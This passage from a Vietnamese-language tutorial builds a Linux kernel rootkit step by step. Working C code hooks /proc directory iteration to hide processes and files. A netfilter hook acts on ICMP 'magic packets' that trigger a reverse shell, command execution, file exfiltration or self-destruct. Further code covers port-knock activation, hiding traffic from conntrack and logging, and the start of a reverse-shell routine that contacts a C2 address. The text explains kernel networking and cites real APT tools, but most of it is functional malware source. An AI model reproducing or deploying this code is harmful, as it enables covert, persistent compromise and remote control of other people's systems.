 *   Kernel iterate entries → cho moi entry goi ctx->actor
 *   actor = filldir function (ghi entry vao user buffer)
 *
 * Hook strategy:
 *   1. Lay original iterate_shared
 *   2. Replace bang hooked version
 *   3. Hooked version tao wrapper dir_context voi custom filldir
 *   4. Custom filldir filter entries truoc khi pass toi original filldir
 *
 * Thread safety:
 *   Khong dung global variable cho orig_proc_filldir vi
 *   2 CPUs concurrent goi iterate_shared co the race:
 *     CPU1: set orig = filldir_A
 *     CPU2: set orig = filldir_B
 *     CPU1: dung orig (= filldir_B!) ← WRONG
 *   Giai phap: dung per-call storage trong wrapper struct.
 * ══════════════════════════════════════════════════════════════ */

static int (*orig_proc_iterate)(struct file *, struct dir_context *);

/*
 * Wrapper struct chua per-call data.
 *
 * Embed custom dir_context (voi actor = filter) VA pointer
 * toi ORIGINAL dir_context. Khi can goi original filldir,
 * pass original context (khong phai wrapper) de tranh
 * container_of corruption.
 *
 * Layout:
 *   rk_filldir_data {
 *       dir_context ctx;       ← passed to orig iterate (actor = our filter)
 *       dir_context *orig_ctx; ← pointer to caller's ORIGINAL context
 *   }
 */
struct rk_filldir_data {
    struct dir_context  ctx;        /* Wrapper context (actor = our filter) */
    struct dir_context *orig_ctx;   /* Pointer toi ORIGINAL user context */
};

/*
 * Custom filldir — called cho moi entry trong /proc
 *
 * dir_context callback signature:
 *   filldir_ret_t filldir(struct dir_context *ctx, const char *name,
 *                         int namlen, loff_t offset, u64 ino,
 *                         unsigned int d_type)
 *
 * name    = entry name (e.g., "1234" for PID 1234, "cpuinfo", "meminfo")
 * namlen  = length of name
 * d_type  = DT_DIR, DT_REG, etc.
 *
 * Return FILLDIR_SKIP de skip entry (an) ma van tiep tuc iterate.
 */
static filldir_ret_t rk_proc_filldir(struct dir_context *ctx,
                                      const char *name, int namlen,
                                      loff_t offset, u64 ino,
                                      unsigned int d_type)
{
    /* Recover per-call data tu wrapper struct */
    struct rk_filldir_data *data =
        container_of(ctx, struct rk_filldir_data, ctx);

    /* Case 1: An PID directory */
    if (d_type == DT_DIR) {
        long pid_val;
        char pid_str[16];

        /* Copy name vi kstrtol can null-terminated string.
         * name tu kernel da null-terminated nhung safe practice. */
        if (namlen < sizeof(pid_str)) {
            memcpy(pid_str, name, namlen);
            pid_str[namlen] = '\0';

            if (kstrtol(pid_str, 10, &pid_val) == 0) {
                /* name la numeric → PID directory.
                 * Check neu PID can an. */
                if (is_pid_hidden((pid_t)pid_val))
                    return FILLDIR_SKIP;  /* Skip — PID an, tiep tuc iterate */
            }
        }
    }

    /* Case 2: An file/directory co prefix */
    if (namlen >= strlen(HIDDEN_PREFIX) &&
        strncmp(name, HIDDEN_PREFIX, strlen(HIDDEN_PREFIX)) == 0) {
        return FILLDIR_SKIP;  /* Skip entry, tiep tuc iterate */
    }

    /* Entry hop le — goi original filldir voi ORIGINAL context.
     *
     * QUAN TRONG: pass data->orig_ctx (original context), KHONG phai
     * &data->ctx (wrapper). Original filldir co the dung container_of
     * tren context → neu pass wrapper → tinh toan offset sai →
     * memory corruption.
     *
     * orig_ctx->actor = original filldir callback tu VFS layer. */
    return data->orig_ctx->actor(data->orig_ctx, name, namlen,
                                  offset, ino, d_type);
}

/*
 * Hooked iterate_shared — tao wrapper context per-call.
 *
 * Tao rk_filldir_data tren stack (per-call, thread-safe).
 * Set actor = rk_proc_filldir, luu pointer toi original context.
 * Pass wrapper toi orig_proc_iterate.
 */
static int hooked_proc_iterate(struct file *file,
                                struct dir_context *ctx)
{
    int ret;

    /* Wrap user's dir_context trong struct chua per-call data */
    struct rk_filldir_data data = {
        .ctx.actor = rk_proc_filldir,
        .ctx.pos   = ctx->pos,
        .orig_ctx  = ctx,    /* Save pointer to original */
    };

    /* Goi original iterate_shared voi wrapped context.
     * Kernel se iterate /proc entries → goi rk_proc_filldir
     * cho moi entry → rk_proc_filldir filter → pass hoac skip. */
    ret = orig_proc_iterate(file, &data.ctx);

    /* Sync position back to original context.
     * iterate_shared updates ctx->pos — ta can propagate
     * change ve original context. */
    ctx->pos = data.ctx.pos;

    return ret;
}

/* ══════════════════════════════════════════════════════════════
 * INSTALLATION
 *
 * De hook iterate_shared, ta phai:
 * 1. Tim file_operations struct cua /proc root
 * 2. Save original iterate_shared pointer
 * 3. Replace bang hooked version
 *
 * Thach thuc: file_operations thuong const (read-only).
 * Phai make writable truoc khi modify.
 * ══════════════════════════════════════════════════════════════ */

static struct file_operations *proc_fops = NULL;

int rk_vfs_hook_install(void)
{
    struct file *proc_file;

    /* Mo /proc de lay file_operations.
     *
     * filp_open(): kernel-internal open. Khac open() syscall:
     * - Khong di qua VFS name resolution chain
     * - Truc tiep resolve path va return struct file *
     * - Chay trong kernel context (khong phai process context fd) */
    proc_file = filp_open("/proc", O_RDONLY, 0);
    if (IS_ERR(proc_file)) {
        pr_err("rk: cannot open /proc\n");
        return PTR_ERR(proc_file);
    }

    /* Lay file_operations tu struct file.
     *
     * f_op = file operations table cho file/directory nay.
     * Moi file thuoc cung filesystem type chia se f_op.
     * → Modify f_op = affect TAT CA files cung type.
     * Cho /proc: proc_root_operations la shared. */
    proc_fops = (struct file_operations *)proc_file->f_op;

    /* Save original */
    orig_proc_iterate = proc_fops->iterate_shared;

    /* Make f_op writable.
     * file_operations struct thuong trong read-only memory. */
    rk_unprotect_memory();

    /* Overwrite iterate_shared pointer */
    proc_fops->iterate_shared = hooked_proc_iterate;

    rk_protect_memory();

    filp_close(proc_file, NULL);

    pr_info("rk: VFS hook installed on /proc\n");
    return 0;
}

void rk_vfs_hook_remove(void)
{
    if (!proc_fops || !orig_proc_iterate)
        return;

    rk_unprotect_memory();
    proc_fops->iterate_shared = orig_proc_iterate;
    rk_protect_memory();

    pr_info("rk: VFS hook removed from /proc\n");
}
```

---

## Chapter 8: Network Rootkit — Netfilter & Covert Channel

### 8.0 Network Stack Internals — Tu NIC toi socket

De hieu rootkit network hooking, ban can hieu duong di cua packet tu khi vao NIC den khi toi application, va nguoc lai. Rootkit hook vao cac diem chinh tren duong di nay.

#### 8.0.1 Packet Receive Path — Tung buoc tu hardware toi userspace

```
  ┌──────────────────────────────────────────────────────────────┐
  │ PACKET RECEIVE PATH (Ingress)                                │
  │                                                              │
  │ 1. NIC nhan frame tu wire/wifi                               │
  │    │  Hardware interrupt (IRQ) fired                         │
  │    ▼                                                         │
  │ 2. IRQ Handler (drivers/net/ethernet/...)                    │
  │    │  Schedule NAPI poll (khong xu ly packet trong IRQ!)      │
  │    │  napi_schedule() — chuyen sang softirq context           │
  │    ▼                                                         │
  │ 3. NAPI Poll (net/core/dev.c — napi_poll)                   │
  │    │  Doc packets tu NIC ring buffer (batch processing)      │
  │    │  Tao/fill sk_buff cho moi packet                        │
  │    │  Goi netif_receive_skb() cho moi packet                │
  │    ▼                                                         │
  │ 4. netif_receive_skb() → __netif_receive_skb_core()         │
  │    │  XDP processing (neu co)                                │
  │    │  Protocol handler dispatch (ip_rcv cho IPv4)            │
  │    ▼                                                         │
  │ 5. ip_rcv() (net/ipv4/ip_input.c)                           │
  │    │  Validate IP header (checksum, version, length)         │
  │    ▼                                                         │
  │ ┌──────────────────────────────────────────────────────┐     │
  │ │ 6. NF_INET_PRE_ROUTING hooks ← ═══ ROOTKIT ═══      │     │
  │ │    Netfilter hook POINT — earliest interception      │     │
  │ │    Rootkit registered hook chay o day                │     │
  │ │    Verdicts: NF_ACCEPT, NF_DROP, NF_STOLEN           │     │
  │ └──────────────────────────────────────────────────────┘     │
  │    │                                                         │
  │    ▼                                                         │
  │ 7. ip_route_input() — routing decision                      │
  │    │                                                         │
  │    ├─── For LOCAL delivery: ──────────────────────┐          │
  │    │    │                                          │          │
  │    │    ▼                                          │          │
  │    │    NF_INET_LOCAL_IN hooks ← rootkit co the   │          │
  │    │    │                         hook o day       │          │
  │    │    ▼                                          │          │
  │    │    Transport layer:                           │          │
  │    │    tcp_v4_rcv() hoac udp_rcv()               │          │
  │    │    │                                          │          │
  │    │    ▼                                          │          │
  │    │    Socket receive buffer → application read   │          │
  │    │                                               │          │
  │    └─── For FORWARDING: ──────────────────────────┘          │
  │         │                                                    │
  │         ▼                                                    │
  │         NF_INET_FORWARD hooks                                │
  │         │                                                    │
  │         ▼                                                    │
  │         NF_INET_POST_ROUTING hooks                           │
  │         │                                                    │
  │         ▼                                                    │
  │         dev_queue_xmit() → NIC transmit                      │
  └──────────────────────────────────────────────────────────────┘

  ┌──────────────────────────────────────────────────────────────┐
  │ PACKET SEND PATH (Egress)                                    │
  │                                                              │
  │ Application: send()/sendto()/sendmsg()                       │
  │    │                                                         │
  │    ▼                                                         │
  │ Transport: tcp_sendmsg() / udp_sendmsg()                    │
  │    │  Build TCP/UDP header, segment data                     │
  │    ▼                                                         │
  │ IP: ip_queue_xmit() / ip_push_pending_frames()              │
  │    │  Build IP header                                        │
  │    ▼                                                         │
  │ ┌──────────────────────────────────────────────────────┐     │
  │ │ NF_INET_LOCAL_OUT hooks ← ═══ ROOTKIT ═══            │     │
  │ │   Hook outgoing packets tu local processes           │     │
  │ │   An traffic, modify packets truoc khi gui           │     │
  │ └──────────────────────────────────────────────────────┘     │
  │    │                                                         │
  │    ▼                                                         │
  │ ip_output() → ip_finish_output()                            │
  │    │                                                         │
  │    ▼                                                         │
  │ NF_INET_POST_ROUTING hooks                                  │
  │    │  (SNAT, MASQUERADE)                                     │
  │    ▼                                                         │
  │ dev_queue_xmit() → NIC driver → wire                        │
  └──────────────────────────────────────────────────────────────┘
```

#### 8.0.2 Netfilter Hook Points — 5 diem hook va y nghia

```
  ┌────────────────────────┬────────────────────────────────┬───────────────────────┐
  │ Hook Point             │ Khi nao chay                   │ Rootkit dung de       │
  ├────────────────────────┼────────────────────────────────┼───────────────────────┤
  │ NF_INET_PRE_ROUTING    │ Sau receive, TRUOC routing     │ Magic packet detect   │
  │                        │ decision. Packet moi vao,      │ Drop C2 traffic       │
  │                        │ chua biet local hay forward.   │ DNAT (port redirect)  │
  │                        │                                │ ← ROOTKIT THUONG DUNG │
  ├────────────────────────┼────────────────────────────────┼───────────────────────┤
  │ NF_INET_LOCAL_IN       │ Sau routing, packet cho LOCAL  │ Input firewall        │
  │                        │ host. Da biet packet la cho ta.│ Filter incoming conns │
  │                        │                                │ Hide specific ports   │
  ├────────────────────────┼────────────────────────────────┼───────────────────────┤
  │ NF_INET_FORWARD        │ Packet duoc FORWARD (router).  │ Forward firewall      │
  │                        │ KHONG phai cho local host.     │ (it dung cho rootkit) │
  ├────────────────────────┼────────────────────────────────┼───────────────────────┤
  │ NF_INET_LOCAL_OUT      │ Packet tu LOCAL process, TRUOC │ Filter outgoing       │
  │                        │ routing. Generate boi socket.  │ Hide rootkit traffic  │
  │                        │                                │ Modify outgoing pkts  │
  ├────────────────────────┼────────────────────────────────┼───────────────────────┤
  │ NF_INET_POST_ROUTING   │ Sau routing, TRUOC khi gui ra  │ SNAT, MASQUERADE      │
  │                        │ NIC. Packet sap di ra wire.    │ (it dung cho rootkit) │
  └────────────────────────┴────────────────────────────────┴───────────────────────┘

  Netfilter verdicts:
  ─────────────────────────────────────────────────────────────
  NF_ACCEPT  — Cho packet di tiep qua cac hooks tiep theo
  NF_DROP    — Huy packet. kfree_skb() duoc goi. Silent drop.
  NF_STOLEN  — "Toi lay quyen so huu packet nay."
               Netfilter KHONG free packet, KHONG xu ly tiep.
               Rootkit PHAI tu kfree_skb() hoac no se LEAK.
               Packet KHONG bao gio toi application layer.
               → INVISIBLE cho tcpdump (neu capture SAU hook)
               → INVISIBLE cho netstat, ss
  NF_QUEUE   — Gui packet toi userspace (nfqueue)
  NF_REPEAT  — Goi lai hook nay (careful: infinite loop!)
```

#### 8.0.3 struct sk_buff — Cau truc QUAN TRONG NHAT cua networking

`struct sk_buff` (include/linux/skbuff.h) la cau truc bieu dien MOI packet trong Linux kernel. Moi packet nhan hoac gui deu la mot `sk_buff`. Struct nay khoang ~232 bytes metadata + variable-length data buffer.

```
  ┌── struct sk_buff (include/linux/skbuff.h) ─────────────────────────┐
  │                                                                     │
  │  struct sk_buff *next, *prev;   — packet queue (doubly-linked)     │
  │  struct sock *sk;               — owning socket (NULL if no sock)  │
  │  struct net_device *dev;        — network device (eth0, lo, etc.)  │
  │  unsigned long _skb_refdst;     — routing destination cache        │
  │                                                                     │
  │  ┌─────────────────────────────────────────────────────────────┐   │
  │  │ Buffer Pointers — quan trong nhat de hieu packet parsing    │   │
  │  │                                                              │   │
  │  │  unsigned char *head;   ─┐  Bat dau cua allocated buffer    │   │
  │  │  unsigned char *data;   ─┤  Bat dau cua packet data hien tai│   │
  │  │  unsigned char *tail;   ─┤  Ket thuc cua packet data        │   │
  │  │  unsigned char *end;    ─┘  Ket thuc cua allocated buffer   │   │
  │  │                                                              │   │
  │  │  Bat buoc: head <= data <= tail <= end                       │   │
  │  └─────────────────────────────────────────────────────────────┘   │
  │                                                                     │
  │  unsigned int network_header;   — offset tu head toi IP header      │
  │  unsigned int transport_header; — offset tu head toi TCP/UDP header│
  │  unsigned int mac_header;       — offset tu head toi MAC header    │
  │  (sk_buff_data_t = unsigned int, 32-bit, NOT __u16)                │
  │                                                                     │
  │  __u32 len;                — tong chieu dai data (bao gom fragments)│
  │  __u32 data_len;           — chieu dai data trong fragments        │
  │  __u16 protocol;           — ETH_P_IP (0x0800), ETH_P_ARP, etc.   │
  │  __u8  pkt_type;           — PACKET_HOST, PACKET_BROADCAST, etc.   │
  │                                                                     │
  │  struct sec_path *sp;      — IPsec path                            │
  │  __u32 mark;               — packet mark (dung boi iptables/nft)   │
  └─────────────────────────────────────────────────────────────────────┘

  Buffer layout trong memory:
  ═══════════════════════════════════════════════════════════════════════

  head ──────────────────────────────────────────────────────────── end
  │         │                                              │       │
  │ headroom│  [Ethernet][IP header][TCP header][Payload]   │tailroom│
  │         │                                              │       │
  ─────────data──────────────────────────────────────────tail────────

  headroom: space de prepend headers (vd: them MAC header)
  tailroom: space de append data

  Cach access headers:
  ─────────────────────────────────────────────────────────────────
  struct ethhdr  *eth = eth_hdr(skb);     // skb->head + skb->mac_header
  struct iphdr   *ip  = ip_hdr(skb);      // skb->head + skb->network_header
  struct tcphdr  *tcp = tcp_hdr(skb);     // skb->head + skb->transport_header
  struct udphdr  *udp = udp_hdr(skb);     // tuong tu
  struct icmphdr *icmp = icmp_hdr(skb);   // tuong tu

  Rootkit thuong:
    ip_hdr(skb)->saddr   — lay source IP
    ip_hdr(skb)->daddr   — lay destination IP
    ip_hdr(skb)->protocol — IPPROTO_TCP/UDP/ICMP
    tcp_hdr(skb)->dest   — destination port (network byte order!)
    ntohs(tcp_hdr(skb)->dest) — convert sang host byte order
```

#### 8.0.4 NF_STOLEN Semantics — Hieu ro de tranh memory leak

```
  NF_ACCEPT:                         NF_STOLEN:
  ───────────                        ──────────
  Hook return NF_ACCEPT              Hook return NF_STOLEN
       │                                  │
       ▼                                  ▼
  Netfilter tiep tuc                 Netfilter DUNG XU LY
  xu ly packet qua                   KHONG free skb
  cac hooks tiep theo                KHONG gui tiep
       │                                  │
       ▼                                  ▼
  Packet den application             Rootkit SO HUU skb
  (hoac forward)                     PHAI tu goi kfree_skb(skb)
                                     hoac se MEMORY LEAK
                                     
                                     Packet:
                                     ✗ KHONG toi application
                                     ✗ KHONG co trong tcpdump
                                       (neu capture SAU hook point)
                                     ✗ KHONG generate reply
                                     ✗ KHONG qua remaining hooks
                                     → HOAN TOAN INVISIBLE

  CANH BAO: NF_STOLEN = hook OWN skb hoan toan. Netfilter framework
  KHONG BAO GIO tu free skb khi NF_STOLEN (moi kernel version).
  Hook PHAI goi kfree_skb(skb) sau khi xu ly xong, neu khong → memory leak.
```

#### 8.0.5 call_usermodehelper() — Spawn userspace process tu kernel

```
  call_usermodehelper(path, argv, envp, wait)

  ┌─────────────────────────────────────────────────────────────┐
  │ Kernel Context                                               │
  │                                                              │
  │ 1. Allocate subprocess_info struct                          │
  │ 2. Queue work tren khelper_wq (workqueue)                   │
  │    │                                                         │
  │    ▼                                                         │
  │ 3. Worker thread (kthreadd's child) pick up work            │
  │ 4. kernel_thread() → fork kernel thread                     │
  │ 5. New kernel thread goi kernel_execve(path, argv, envp)    │
  │    │  → chuyen tu kernel space sang user space               │
  │    │  → load ELF binary                                      │
  │    │  → setup user stack, registers                           │
  │    │  → process chay voi uid=0, full capabilities            │
  │    ▼                                                         │
  │ 6. Userspace process chay (vd: /bin/bash -c "...")           │
  │                                                              │
  │ Wait flags:                                                  │
  │   UMH_NO_WAIT   — return ngay, khong doi process            │
  │   UMH_WAIT_EXEC — doi den khi exec hoan thanh (nhung ko doi │
  │                    process exit)                              │
  │   UMH_WAIT_PROC — doi den khi process EXIT (blocking!)      │
  │                    NGUY HIEM neu process chay mai (reverse   │
  │                    shell) → kernel thread block vinh vien     │
  └─────────────────────────────────────────────────────────────┘

  OPSEC issue: Process spawned boi call_usermodehelper co:
  ─────────────────────────────────────────────────────────
  - PPID = 2 (kthreadd) → BAT THUONG
    (process binh thuong co PPID la shell hoac init)
  - Forensics: ps auxf thay /bin/bash voi parent kthreadd
  - Detection: kiem tra /proc/PID/status → PPid: 2
  - Mitigation: rootkit an process qua DKOM hoac getdents hook
```

**Tham khao source:** `net/core/dev.c` (netif_receive_skb), `net/ipv4/ip_input.c` (ip_rcv), `net/ipv4/netfilter/` (netfilter hooks), `include/linux/skbuff.h` (sk_buff), `include/linux/netfilter.h` (hook ops), `kernel/umh.c` (call_usermodehelper)

---

```c
/* netfilter.c — Network hiding va covert communication
 *
 * Netfilter = Linux kernel framework xu ly packets tai cac
 * hook points trong network stack.
 *
 * Hook points (NF_INET_*):
 *
 *   ┌──────────────────────────────────────────────────┐
 *   │               Network Stack                       │
 *   │                                                  │
 *   │  Incoming:                                       │
 *   │   NIC → PRE_ROUTING → [routing] → LOCAL_IN → App│
 *   │                          │                       │
 *   │                          └→ FORWARD → POST_ROUTING → NIC
 *   │                                                  │
 *   │  Outgoing:                                       │
 *   │   App → LOCAL_OUT → [routing] → POST_ROUTING → NIC│
 *   └──────────────────────────────────────────────────┘
 *
 *   PRE_ROUTING:  packet vua arrive, truoc routing decision
 *   LOCAL_IN:     packet destined cho local machine
 *   FORWARD:      packet duoc forward (router mode)
 *   LOCAL_OUT:    locally-generated packet
 *   POST_ROUTING: packet chuan bi leave
 *
 * Rootkit hook PRE_ROUTING hoac LOCAL_IN de:
 *   1. Detect magic packets (trigger backdoor)
 *   2. Hide C2 traffic (NF_STOLEN — "an" packet)
 *   3. Port knocking (SYN sequence detection)
 *   4. Covert channel (data in ICMP, DNS, TCP options)
 */

#include "rootkit.h"
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
#include <linux/ip.h>
#include <linux/tcp.h>
#include <linux/udp.h>
#include <linux/icmp.h>
#include <linux/inet.h>
#include <net/ip.h>
#include <net/tcp.h>

/* ══════════════════════════════════════════════════════════════
 * MAGIC PACKET TRIGGER
 *
 * Passive backdoor — rootkit KHONG beacon, doi magic packet.
 * Pattern tu BPFDoor (APT):
 *   1. Attacker gui specially crafted packet
 *   2. Rootkit detect magic bytes trong packet
 *   3. Rootkit activate — open reverse shell / execute command
 *
 * Packet KHONG di toi application layer (NF_STOLEN) → invisible
 * cho netstat, tcpdump (neu capture SAU netfilter hook).
 *
 * Magic packet format (custom):
 *   ICMP Echo Request voi payload bat dau bang magic bytes.
 *   ICMP vi: firewall thuong cho qua ICMP, looks like ping.
 * ══════════════════════════════════════════════════════════════ */

#define MAGIC_VALUE    0xDEAD1337  /* 4 bytes magic identifier */
#define MAGIC_PASS     "s3cr3t"    /* Password trong payload */

/*
 * Magic packet payload structure:
 *   ┌───────────┬──────────────┬──────────────┬──────────────┐
 *   │ magic(4B) │ password(32B)│ cmd_type(1B) │ cmd_data(var)│
 *   └───────────┴──────────────┴──────────────┴──────────────┘
 *
 * cmd_type:
 *   0x01 = activate reverse shell (cmd_data = C2 IP:port)
 *   0x02 = execute command (cmd_data = command string)
 *   0x03 = exfiltrate file (cmd_data = filepath)
 *   0x04 = self-destruct (remove rootkit)
 */
struct magic_packet {
    u32  magic;
    char password[32];
    u8   cmd_type;
    char cmd_data[256];
} __attribute__((packed));

/* ══════════════════════════════════════════════════════════════
 * PORT KNOCKING
 *
 * Sequence detection: attacker gui SYN packets toi ports
 * theo dung thu tu → rootkit activate.
 *
 * Vi du sequence: SYN→1234, SYN→5678, SYN→9012
 * Dung thu tu = unlock. Sai thu tu = reset.
 *
 * Uu diem so voi magic packet:
 *   - SYN packets giong port scan → it suspicious
 *   - Khong can crafted payload
 *   - Firewall thay dropped SYNs (closed ports) → normal
 * ══════════════════════════════════════════════════════════════ */

#define KNOCK_SEQUENCE_LEN 3
static const u16 knock_sequence[KNOCK_SEQUENCE_LEN] = {
    7000, 8000, 9000
};

struct knock_state {
    __be32 src_ip;           /* Source IP dang knock */
    int    current_step;     /* Step hien tai trong sequence */
    unsigned long timestamp; /* Timeout tracking */
};

#define MAX_KNOCK_STATES 16
static struct knock_state knock_states[MAX_KNOCK_STATES];
static DEFINE_SPINLOCK(knock_lock);

static struct knock_state *find_knock_state(__be32 src_ip)
{
    int i;
    for (i = 0; i < MAX_KNOCK_STATES; i++) {
        if (knock_states[i].src_ip == src_ip)
            return &knock_states[i];
    }
    return NULL;
}

static struct knock_state *alloc_knock_state(__be32 src_ip)
{
    int i;

    /* Tim slot trong hoac expired */
    for (i = 0; i < MAX_KNOCK_STATES; i++) {
        if (knock_states[i].src_ip == 0 ||
            time_after(jiffies,
                       knock_states[i].timestamp + 30 * HZ)) {
            /* time_after(a, b): true neu a sau b.
             * 30 * HZ = 30 seconds timeout.
             * HZ = ticks per second (thuong 250 hoac 1000). */
            knock_states[i].src_ip = src_ip;
            knock_states[i].current_step = 0;
            knock_states[i].timestamp = jiffies;
            return &knock_states[i];
        }
    }
    return NULL;
}

static bool check_port_knock(__be32 src_ip, u16 dest_port)
{
    struct knock_state *state;
    bool activated = false;

    spin_lock(&knock_lock);

    state = find_knock_state(src_ip);

    if (!state) {
        /* New knocker — check if first port matches */
        if (dest_port == knock_sequence[0]) {
            state = alloc_knock_state(src_ip);
            if (state)
                state->current_step = 1;
        }
        spin_unlock(&knock_lock);
        return false;
    }

    /* Timeout check */
    if (time_after(jiffies, state->timestamp + 30 * HZ)) {
        state->src_ip = 0;  /* Expired — reset */
        spin_unlock(&knock_lock);
        return false;
    }

    /* Check if port matches next expected in sequence */
    if (dest_port == knock_sequence[state->current_step]) {
        state->current_step++;
        state->timestamp = jiffies;

        if (state->current_step >= KNOCK_SEQUENCE_LEN) {
            /* SEQUENCE COMPLETE — activate backdoor */
            activated = true;
            state->src_ip = 0;  /* Reset state */
            pr_info("rk: port knock sequence completed from %pI4\n",
                    &src_ip);
        }
    } else {
        /* Wrong port — reset sequence */
        state->src_ip = 0;
    }

    spin_unlock(&knock_lock);
    return activated;
}

/* Forward declarations cho functions defined later in this file */
static void rk_spawn_reverse_shell(const char *c2_addr);
static void rk_execute_command(const char *cmd);
static void rk_exfiltrate_file(const char *filepath, __be32 dest_ip);
static void rk_self_destruct(void);
static void rk_activate_backdoor(__be32 authorized_ip);

/* ══════════════════════════════════════════════════════════════
 * NETFILTER HOOK CALLBACK — Main packet handler
 * ══════════════════════════════════════════════════════════════ */

static unsigned int nf_hook_handler(void *priv,
                                     struct sk_buff *skb,
                                     const struct nf_hook_state *state)
{
    struct iphdr *ip_header;
    struct tcphdr *tcp_header;
    struct icmphdr *icmp_header;
    unsigned int data_len;
    unsigned char *data;

    if (!skb)
        return NF_ACCEPT;

    /* Lay IP header.
     *
     * sk_buff = socket buffer — chua packet data + metadata.
     * ip_hdr(skb): macro tra ve pointer toi IP header trong skb. */
    ip_header = ip_hdr(skb);

    /* ──── ICMP Magic Packet Detection ──── */
    if (ip_header->protocol == IPPROTO_ICMP) {
        icmp_header = icmp_hdr(skb);

        /* Chi xu ly Echo Request (type 8) — looks like ping */
        if (icmp_header->type == ICMP_ECHO) {
            /* Payload bat dau SAU ICMP header */
            data = (unsigned char *)icmp_header + sizeof(struct icmphdr);
            data_len = ntohs(ip_header->tot_len)
                     - (ip_header->ihl * 4)
                     - sizeof(struct icmphdr);

            if (data_len >= sizeof(struct magic_packet)) {
                struct magic_packet *mp = (struct magic_packet *)data;

                if (ntohl(mp->magic) == MAGIC_VALUE &&
                    strncmp(mp->password, MAGIC_PASS,
                            strlen(MAGIC_PASS)) == 0) {

                    /* Magic packet nhan dien!
                     * Dispatch theo cmd_type */
                    pr_info("rk: magic packet from %pI4, cmd=%d\n",
                            &ip_header->saddr, mp->cmd_type);

                    switch (mp->cmd_type) {
                    case 0x01:
                        /* Reverse shell — spawn kthread */
                        rk_spawn_reverse_shell(mp->cmd_data);
                        break;
                    case 0x02:
                        /* Execute command */
                        rk_execute_command(mp->cmd_data);
                        break;
                    case 0x03:
                        /* Exfiltrate file — doc file va gui qua ICMP */
                        rk_exfiltrate_file(mp->cmd_data, ip_header->saddr);
                        break;
                    case 0x04:
                        /* Self-destruct */
                        rk_self_destruct();
                        break;
                    }

                    /* NF_STOLEN: kernel "quen" packet nay.
                     *
                     * Packet KHONG:
                     *   - Di vao userspace application
                     *   - Xuat hien trong tcpdump (neu capture SAU hook)
                     *   - Generate ICMP reply
                     *   - Di qua remaining netfilter hooks
                     *
                     * NF_STOLEN = ta own skb, netfilter KHONG free.
                     * PHAI goi kfree_skb truoc return. */
                    kfree_skb(skb);
                    return NF_STOLEN;
                }
            }
        }
    }

    /* ──── TCP Port Knock Detection ──── */
    if (ip_header->protocol == IPPROTO_TCP) {
        tcp_header = tcp_hdr(skb);

        /* Chi xu ly SYN packets (connection initiation) */
        if (tcp_header->syn && !tcp_header->ack) {
            u16 dest_port = ntohs(tcp_header->dest);

            if (check_port_knock(ip_header->saddr, dest_port)) {
                /* Knock sequence complete → activate */
                rk_activate_backdoor(ip_header->saddr);
            }
        }

        /* ──── Hide traffic tren HIDDEN_PORT ──── */
        if (ntohs(tcp_header->source) == HIDDEN_PORT ||
            ntohs(tcp_header->dest)   == HIDDEN_PORT) {
            /* Detach skb tu conntrack → netstat/ss khong thay connection.
             *
             * nf_reset_ct(skb): xoa conntrack entry tu skb.
             * Conntrack module track connections qua nf_conn struct
             * gan vao skb->_nfct. Reset no → connection "khong ton tai"
             * trong /proc/net/nf_conntrack va conntrack -L output.
             *
             * Ket qua: ss/netstat khong list port nay vi
             * inet_diag dua vao sk, nhung conntrack-based tools
             * (iptstate, conntrack -L) se miss. */
            nf_reset_ct(skb);

            /* Mark packet de nftables/iptables LOG rules skip.
             * Mark 0xDEAD = custom marker, iptables rule:
             *   -m mark --mark 0xDEAD -j ACCEPT (bypass LOG) */
            skb->mark = 0xDEAD;
        }
    }

    return NF_ACCEPT;  /* Cho tat ca traffic khac pass */
}

/* ══════════════════════════════════════════════════════════════
 * NETFILTER REGISTRATION
 * ══════════════════════════════════════════════════════════════ */

static struct nf_hook_ops nf_ops = {
    .hook     = nf_hook_handler,
    .pf       = PF_INET,            /* IPv4 */
    .hooknum  = NF_INET_PRE_ROUTING, /* Earliest hook point */
    .priority = NF_IP_PRI_FIRST,     /* Highest priority — chay truoc moi hook khac */
};

/* Neu can hook IPv6: register them voi pf = PF_INET6 */

int rk_net_init(void)
{
    int err;

    /* nf_register_net_hook(): register hook trong network namespace.
     * &init_net = initial (default) network namespace. */
    err = nf_register_net_hook(&init_net, &nf_ops);
    if (err) {
        pr_err("rk: netfilter hook registration failed: %d\n", err);
        return err;
    }

    memset(knock_states, 0, sizeof(knock_states));

    pr_info("rk: netfilter hook registered\n");
    return 0;
}

void rk_net_cleanup(void)
{
    nf_unregister_net_hook(&init_net, &nf_ops);
    pr_info("rk: netfilter hook unregistered\n");
}
```

### 8.2 Reverse Shell — rk_spawn_reverse_shell

```c
/* reverse_shell.c — Kernel-level reverse shell
 *
 * Khi magic packet hoac port knock trigger, rootkit mo
 * reverse shell connection TU kernel space.
 *
 * 2 approaches:
 *   A) call_usermodehelper: spawn userspace process tu kernel
 *      → Don gian, dung /bin/bash. Nhung process visible tru khi hidden.
 *   B) Kernel socket: tao TCP connection trong kernel, pipe I/O
 *      → Khong co process moi. Nhung phuc tap hon nhieu.
 *
 * APT approach: thuong dung (A) + hide spawned process.
 * Drovorub, Reptile deu dung call_usermodehelper pattern.
 */

#include "rootkit.h"
#include <linux/kmod.h>       /* call_usermodehelper */
#include <linux/kthread.h>    /* kthread_create, kthread_run */
#include <net/sock.h>
#include <linux/net.h>
#include <linux/in.h>
#include <linux/inet.h>

/* ══════════════════════════════════════════════════════════════
 * METHOD A: call_usermodehelper — Spawn bash reverse shell
 *
 * call_usermodehelper() la kernel API cho phep kernel code
 * chay mot userspace program. Kernel dung API nay internally
 * cho hotplug events, modprobe, etc.
 *
 * Cach hoat dong:
 *   1. Kernel fork mot kernel thread
 *   2. Kernel thread exec userspace binary
 *   3. Binary chay voi full root privileges
 *   4. Ket qua tra ve qua wait flags
 *
 * Tai sao khong dung execve truc tiep:
 *   - execve replace current process image
 *   - Trong kernel context, "current" la kernel thread/interrupted task
 *   - Goi execve truc tiep tu kernel = corrupt kernel state
 *   - call_usermodehelper handle fork+exec properly
 *
 * Security consideration:
 *   Process duoc spawn se visible trong ps neu khong hidden.
 *   Rootkit nen tu add PID vao hidden list ngay sau spawn.
 *   Hoac: an qua process name matching.
 * ══════════════════════════════════════════════════════════════ */

static void rk_spawn_reverse_shell(const char *c2_addr)
{
    /* Parse c2_addr format: "IP:PORT"
     * Vi du: "10.10.10.1:4444" */
    char ip[64], port[16];
    char *colon;
    char bash_cmd[512];

    /* Copy vi strsep modifies string */
    strncpy(ip, c2_addr, sizeof(ip) - 1);
